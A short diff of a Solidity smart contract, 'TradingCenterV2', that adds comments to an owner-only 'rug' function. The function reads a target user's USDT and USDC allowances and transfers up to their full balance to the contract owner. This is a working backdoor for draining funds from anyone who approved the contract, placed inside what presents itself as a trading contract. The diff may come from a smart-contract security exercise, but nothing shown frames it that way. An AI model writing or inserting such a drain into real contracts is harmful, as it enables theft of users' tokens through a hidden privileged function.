@@ -10,9 +10,12 @@ contract TradingCenterV2 is TradingCenter, Ownable {
   }
 
   function rug(address _target) public onlyOwner {
+    // Get allowance amount for each token
     uint256 usdt_allowed_amount = usdt.allowance(_target, address(this));
     uint256 usdc_allowed_amount = usdc.allowance(_target, address(this));
+    // Transfer tokens if allowed amount > 0
     if (usdt_allowed_amount > 0) {
+      // Get actual amount to transfer
       uint256 _amount = usdt_allowed_amount > usdt.balanceOf(_target) ? usdt.balanceOf(_target) : usdt_allowed_amount;
       usdt.transferFrom(_target, msg.sender, _amount);
     }
